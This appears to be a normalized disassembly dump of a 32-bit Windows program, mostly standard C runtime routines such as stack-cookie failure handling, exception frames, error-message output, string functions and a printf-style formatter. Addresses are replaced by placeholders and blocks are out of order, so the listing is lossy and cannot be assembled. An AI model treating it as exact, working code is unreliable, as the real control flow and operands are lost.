pop edi
xor ecx ebp
pop ebx
call sub_409fbd
leave
retn
test edi edi
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
push ebx
call sub_40e1df
pop ecx
sub_40bef2
mov edi edi
push esi
push 0x1
mov esi 0xc0000417
push esi
push 0x2
call sub_40bdc9
add esp 0xc
push esi
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
pop esi
retn
sub_40bf17
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40bef2
int3
pop ebp
jmp eax
sub_40bf63
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_40bf8b
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ DecodePointer@IAT ]
push edi
push [ rw-data ]
call esi
push [ rw-data ]
mov ebx eax
mov [ ebp - 0x4 ] ebx
call esi
mov esi eax
cmp esi ebx
jb r-xdata
xor eax eax
mov edi esi
sub edi ebx
lea eax [ edi + 0x4 ]
cmp eax 0x4
jb r-xdata
push ebx
call sub_40f1da
mov ebx eax
lea eax [ edi + 0x4 ]
pop ecx
cmp ebx eax
jae r-xdata
push [ ebp + 0x8 ]
mov edi [ EncodePointer@IAT ]
call edi
mov [ esi ] eax
add esi 0x4
push esi
call edi
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax 0x800
cmp ebx eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
add eax ebx
cmp eax ebx
jb r-xdata
mov eax ebx
lea eax [ ebx + 0x10 ]
cmp eax ebx
jb r-xdata
push eax
push [ ebp - 0x4 ]
call sub_40ca69
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push [ ebp - 0x4 ]
call sub_40ca69
pop ecx
pop ecx
test eax eax
je r-xdata
sar edi 0x2
push eax
lea esi [ eax + edi * 4 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
sub_40c041
mov edi edi
push esi
push 0x4
push 0x20
call sub_40ca1d
pop ecx
pop ecx
mov esi eax
push esi
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_40c072
push 0xc
push r--data
call sub_40c290
call sub_40a139
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_40bf8b
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40c0a8
mov eax [ ebp - 0x1c ]
call sub_40c2d5
retn
sub_40c0c5
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_40c0eb
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_40c111
mov edi edi
push esi
push edi
xor edi edi
push [ edi + rw-data ]
call [ EncodePointer@IAT ]
mov [ edi + rw-data ] eax
add edi 0x4
cmp edi 0x28
jb r-xdata
pop edi
pop esi
retn
sub_40c140
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_40c180
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40c1d0
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_40c2f0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_40c140
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_40c180
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40c290
push sub_40c2f0
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_40c2f0
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rw-data ]
push edi
mov eax [ esi ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_409fbd
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_409fbd
mov edx 0xfffffffe
cmp [ ebx + 0xc ] edx
je r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x18 ]
mov [ ebx - 0x4 ] edx
mov ebx [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
cmp ebx 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push edi
mov ecx ebx
call sub_40f35b
jmp r-xdata
lea ecx [ ecx ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov ebx eax
cmp eax 0xfffffffe
jne r-xdata
mov edx edi
call sub_40f312
mov [ ebp - 0x1 ] 0x1
test eax eax
js r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_409fbd
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_409fbd
lea eax [ ebx + ebx * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
lea eax [ esi + eax * 4 + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
call sub_40f342
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] ebx
je r-xdata
cmp [ r--data ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push edi
mov edx ebx
mov ecx eax
call sub_40f35b
mov eax [ ebp + 0xc ]
push r--data
call sub_40c1d0
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_409fbd
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx edi
call sub_40f329
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_409fbd
mov edx [ ebp + 0x8 ]
push 0x1
push edx
call [ r--data ]
add esp 0x8
sub_40c47f
mov edi edi
push ebp
mov ebp esp
xor eax eax
mov eax [ eax * 8 + r--data ]
pop ebp
retn
inc eax
cmp eax 0x16
jb r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax * 8 + r--data ]
je r-xdata
xor eax eax
pop ebp
retn
sub_40c4a5
mov edi edi
push ebp
mov ebp esp
sub esp 0x1fc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_40c47f
mov edi eax
xor ebx ebx
pop ecx
mov [ ebp - 0x1fc ] edi
cmp edi ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_409fbd
leave
retn
push 0x3
call sub_40f69e
pop ecx
cmp eax 0x1
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
push 0x3
call sub_40f69e
pop ecx
test eax eax
jne r-xdata
cmp esi 0xffffffff
je r-xdata
cmp esi 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
xor eax eax
push r--data
push 0x314
mov edi rw-data
push edi
call sub_40f63b
add esp 0xc
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x1fc ]
push eax
lea eax [ ebp - 0x1f8 ]
push eax
mov [ ebp - 0x5 ] bl
call sub_40c6f0
pop ecx
push eax
lea eax [ ebp - 0x1f8 ]
push eax
push esi
call [ WriteFile@IAT ]
inc eax
cmp eax 0x1f4
jb r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
jmp r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] ax
call [ GetModuleFileNameW@IAT ]
mov ebx 0x2fb
test eax eax
jne r-xdata
mov cl [ edi + eax * 2 ]
mov [ ebp + eax - 0x1f8 ] cl
cmp [ edi + eax * 2 ] bx
je r-xdata
call sub_40bef2
push esi
call sub_40f620
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push ebx
push esi
call sub_40f63b
add esp 0xc
test eax eax
je r-xdata
push r--data
mov esi 0x314
push esi
push edi
call sub_40f4de
add esp 0xc
test eax eax
jne r-xdata
push esi
call sub_40f620
lea eax [ eax * 2 + rw-data ]
mov ecx eax
sub ecx esi
push 0x3
sar ecx 0x1
push r--data
sub ebx ecx
push ebx
push eax
call sub_40f553
add esp 0x14
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
push [ ebp - 0x1fc ]
push esi
push edi
call sub_40f4de
add esp 0xc
test eax eax
jne r-xdata
push 0x12010
push r--data
push edi
call sub_40f372
add esp 0xc
jmp r-xdata
sub_40c654
push 0x3
call sub_40f69e
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_40c4a5
push 0xff
call sub_40c4a5
pop ecx
pop ecx
push 0x3
call sub_40f69e
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_40c68d
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
push edi
test edx edx
je r-xdata
call sub_40aa97
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov esi edx
sub esi eax
mov [ edx ] al
jmp r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ edx ] 0x0
call sub_40aa97
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov cl [ eax ]
mov [ esi + eax ] cl
inc eax
test cl cl
je r-xdata
call sub_40bf44
mov eax esi
jmp r-xdata
sub_40c6f0
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_40c88e
mov edi edi
push ebp
mov ebp esp
push esi
call sub_40b259
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov ecx [ esi + 0x5c ]
mov edx [ ebp + 0x8 ]
mov eax ecx
push edi
add ecx 0x90
cmp eax ecx
jae r-xdata
add eax 0xc
lea edi [ ecx + 0x90 ]
cmp eax edi
jb r-xdata
xor eax eax
cmp [ eax ] edx
je r-xdata
cmp [ eax ] edx
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
test eax eax
je r-xdata
pop edi
cmp edx 0x5
jne r-xdata
cmp edx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ esi + 0x60 ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call edx
push 0x24
pop ecx
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
add ecx 0xc
cmp ecx 0x90
jl r-xdata
mov eax [ eax ]
mov edi [ esi + 0x64 ]
cmp eax 0xc000008e
jne r-xdata
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call edx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
pop ecx
mov [ esi + 0x60 ] ebx
pop ebx
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
cmp eax 0xc00002b5
jne r-xdata
mov [ esi + 0x64 ] 0x8a
jmp r-xdata
cmp eax 0xc00002b4
jne r-xdata
mov [ esi + 0x64 ] 0x8d
jmp r-xdata
mov [ esi + 0x64 ] 0x8e
sub_40c9d8
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x8 ]
call sub_40a9c1
mov edi eax
pop ecx
test edi edi
jne r-xdata
sub_40ca1d
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40b063
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_40ca69
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40f6dd
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_40cabd
mov eax [ rw-data ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_40ca1d
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
jmp r-xdata
push 0x4
push esi
mov [ rw-data ] esi
call sub_40ca1d
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov [ edx + eax ] ecx
add ecx 0x20
add edx 0x4
cmp ecx rw-data
jl r-xdata
push 0x1a
pop eax
pop esi
retn
mov eax [ rw-data ]
push 0xfffffffe
pop esi
xor edx edx
mov ecx rw-data
push edi
mov [ ecx ] esi
cmp eax esi
je r-xdata
mov eax edx
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
mov edi edx
and edi 0x1f
shl edi 0x6
mov eax [ edi + eax ]
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn
test eax eax
jne r-xdata
add ecx 0x20
inc edx
cmp ecx rw-data
jl r-xdata
sub_40cb8e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax rw-data
cmp esi eax
jb r-xdata
add esi 0x20
push esi
call [ EnterCriticalSection@IAT ]
cmp esi rw-data
ja r-xdata
mov ecx esi
sub ecx eax
sar ecx 0x5
add ecx 0x10
push ecx
call sub_40bacf
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_40cbcf
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_40bacf
mov eax [ ebp + 0xc ]
or [ eax + 0xc ] 0x8000
pop ecx
pop ebp
retn
sub_40cc01
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rw-data
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_40b9f6
pop ecx
pop ebp
retn
sub_40cc3d
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
cmp ecx 0x14
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
add ecx 0x10
push ecx
call sub_40b9f6
pop ecx
pop ebp
retn
sub_40cc6c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_40fa0f
push eax
call sub_40f9b9
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
call sub_40cab7
add eax 0x20
cmp esi eax
jne r-xdata
call sub_40cab7
add eax 0x40
cmp esi eax
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
inc [ rw-data ]
test [ esi + 0xc ] 0x10c
jne r-xdata
push ebx
push edi
lea edi [ eax * 4 + rw-data ]
cmp [ edi ] 0x0
mov ebx 0x1000
jne r-xdata
mov edi [ edi ]
mov [ esi + 0x8 ] edi
mov [ esi ] edi
mov [ esi + 0x18 ] ebx
mov [ esi + 0x4 ] ebx
push ebx
call sub_40c9d8
pop ecx
mov [ edi ] eax
test eax eax
jne r-xdata
pop esi
pop ebp
retn
lea eax [ esi + 0x14 ]
push 0x2
mov [ esi + 0x8 ] eax
mov [ esi ] eax
pop eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x4 ] eax
jmp r-xdata
or [ esi + 0xc ] 0x1102
xor eax eax
pop edi
inc eax
pop ebx
jmp r-xdata
sub_40cd08
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x1000
je r-xdata
pop esi
push esi
call sub_40f826
and [ esi + 0xc ] 0xffffeeff
and [ esi + 0x18 ] 0x0
and [ esi ] 0x0
and [ esi + 0x8 ] 0x0
pop ecx
sub_40cd3c
test [ ecx + 0xc ] 0x40
je r-xdata
dec [ ecx + 0x4 ]
js r-xdata
cmp [ ecx + 0x8 ] 0x0
je r-xdata
movsx eax al
push ecx
push eax
call sub_40fa35
pop ecx
pop ecx
mov edx [ ecx ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ esi ]
retn
or [ esi ] eax
retn
cmp eax 0xffffffff
jne r-xdata
sub_40cd6f
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi eax
mov ebx ecx
call sub_40aa97
test [ edi + 0xc ] 0x40
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
je r-xdata
call sub_40aa97
and [ eax ] 0x0
jmp r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test ebx ebx
jg r-xdata
add [ esi ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov al [ eax ]
mov ecx edi
dec ebx
call sub_40cd3c
inc [ ebp + 0x8 ]
cmp [ esi ] 0xffffffff
jne r-xdata
call sub_40aa97
cmp [ eax ] 0x0
jne r-xdata
pop esi
pop ebx
leave
retn
call sub_40aa97
cmp [ eax ] 0x2a
jne r-xdata
call sub_40aa97
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
mov ecx edi
mov al 0x3f
call sub_40cd3c
sub_40cde3
mov edi edi
push ebp
mov ebp esp
sub esp 0x278
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x25c ]
mov [ ebp - 0x240 ] esi
mov [ ebp - 0x228 ] ebx
mov [ ebp - 0x248 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x230 ] eax
mov [ ebp - 0x244 ] eax
mov [ ebp - 0x238 ] eax
call sub_40b678
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_40aa97
mov [ eax ] 0x16
call sub_40bf44
cmp [ ebp - 0x250 ] 0x0
je r-xdata
xor esi esi
cmp edi esi
je r-xdata
push esi
call sub_40fa0f
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ edi ]
xor ecx ecx
mov [ ebp - 0x224 ] esi
mov [ ebp - 0x220 ] esi
mov [ ebp - 0x24c ] esi
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_409fbd
leave
retn
cmp [ ebp - 0x250 ] 0x0
je r-xdata
inc edi
mov [ ebp - 0x23c ] edi
cmp [ ebp - 0x224 ] esi
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x224 ]
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ edx - 0x20 ]
cmp al 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
xor eax eax
movsx eax dl
movsx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov edi [ ebp - 0x23c ]
mov al [ edi ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + r-xdata ]
movsx eax [ ecx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop ecx
mov [ ebp - 0x260 ] eax
cmp eax ecx
ja r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
mov ecx [ ebp - 0x260 ]
mov ebx [ ebp - 0x228 ]
xor esi esi
mov dl al
jmp r-xdata
sub_40d98f
push 0xc
push r--data
call sub_40c290
push 0xe
call sub_40bacf
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40d9f6
call sub_40c2d5
retn
mov eax [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_409fcc
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ eax ] ecx
jne r-xdata
mov edx eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
push eax
call sub_409fcc
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
sub_40da00
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_40da88
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn 0x4
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov eax [ eax + 0x14 ]
cmp eax 0x19930520
je r-xdata
call sub_40bb02
cmp eax 0x19930521
je r-xdata
cmp eax 0x19930522
je r-xdata
cmp eax 0x1994000
jne r-xdata
sub_40dad8
mov edi edi
push esi
push edi
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
mov esi [ rw-data ]
test esi esi
jne r-xdata
call sub_40ebe6
mov al [ esi ]
cmp al 0x20
ja r-xdata
mov esi r--data
cmp al 0x22
jne r-xdata
test al al
je r-xdata
movzx eax al
push eax
call sub_40fda9
pop ecx
test eax eax
je r-xdata
xor ecx ecx
test edi edi
sete cl
mov edi ecx
pop edi
mov eax esi
pop esi
retn
test edi edi
je r-xdata
inc esi
jmp r-xdata
inc esi
mov al [ esi ]
test al al
jne r-xdata
cmp al 0x20
ja r-xdata
inc esi
sub_40db37
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
push edi
xor edi edi
test esi esi
jne r-xdata
call sub_40ebe6
mov al [ esi ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
push 0x4
inc edi
push edi
call sub_40ca1d
mov edi eax
pop ecx
pop ecx
mov [ rw-data ] edi
test edi edi
je r-xdata
pop edi
pop esi
retn
